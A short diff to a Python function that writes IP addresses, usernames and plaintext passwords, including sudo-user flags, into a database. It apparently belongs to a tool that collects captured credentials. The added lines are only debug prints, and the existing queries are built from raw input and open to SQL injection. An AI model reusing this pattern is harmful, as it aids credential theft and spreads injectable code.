@@ -50,20 +50,27 @@ def write_db(addr, data):
 
     userexists = [x for x in user_in_table]
 
+    print("made it here with {ip} - {username}")
+
     if (message_type == 1): # authenticated/chpasswd
         
         if (len(userexists) == 0):
+            print("adding {ip} - {username}")
             cursor.execute(f'''
             INSERT INTO passwords(ip, username, password)
             VALUES ('{ip}', '{username}', '{password}');
             ''')
 
         elif (userexists[0][0] != password):
+            print("updating {ip} - {username}")
             cursor.execute(f'''
             UPDATE passwords
             SET password = '{password}'
             WHERE username = '{username}';
             ''')
+
+        else:
+            print("unknown error adding authenticated user to databse")
     
     elif (message_type == 2): # sudo
 
@@ -74,6 +81,11 @@ def write_db(addr, data):
                 SET known_admin = 1
                 WHERE username = '{username}';
                 ''')
+        else:
+            print("no clue how you got here")
+
+    else:
+        print("Unknown Error adding user to database")
 
     conn.commit()
     conn.close()
